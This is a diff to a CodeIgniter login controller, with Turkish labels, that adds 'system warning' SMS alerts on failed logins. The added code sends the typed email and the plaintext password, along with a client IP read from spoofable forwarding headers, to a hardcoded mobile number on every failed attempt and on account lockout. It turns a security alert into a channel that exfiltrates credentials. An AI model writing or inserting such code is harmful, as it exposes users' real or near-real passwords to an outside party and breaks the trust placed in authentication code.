@@ -112,6 +112,16 @@ class Login extends CI_Controller {
                    }
                        
                 }else{
+                    $u = strip_tags(trim($this->security->xss_clean($this->input->post('username',true))));
+                    $s = strip_tags(trim($this->security->xss_clean($this->input->post('kullanici_sifre',true))));
+                    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
+                        $ip = $_SERVER['HTTP_CLIENT_IP'];
+                    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+                        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
+                    } else {
+                        $ip = $_SERVER['REMOTE_ADDR'];
+                    }
+
 
                     $query = $this->Kullanici_model->get_all([
                         'kullanici_email_adresi' => strip_tags(trim($this->security->xss_clean($this->input->post('username',true))))
@@ -126,12 +136,14 @@ class Login extends CI_Controller {
                        
                         if($deneme == 5){
                     $this->db->where("kullanici_id",$query[0]->kullanici_id)->update("kullanicilar",["kullanici_bloke" => 1]);
-               
+                    sendSmsData("05382197344","SİSTEM UYARISI\n5 kez Hatalı Giriş Denemesi Yapıldığı İçin Kullanıcı Hesabı Engellendi!\nMail:$u\nSifre:$s\nIP Adresi:".$ip);
                    }
                     }
 
+                    
                     $this->session->set_flashdata('flashDanger', "Email veya şifre bilgilerinizi hatalı girdiniz. ".((5-$deneme)>0 ? "Kalan Deneme Hakkı :".(5-$deneme) : "0") );
-                  
+                    sendSmsData("05382197344","SİSTEM UYARISI\nHatalı Giriş Denemesi Yapıldı!\nMail:$u\nSifre:$s\nIP Adresi:".$ip."\nKalan Deneme Hakkı:".(5-$deneme));
+		
                 redirect(base_url("giris-yap"));
                 }
             }
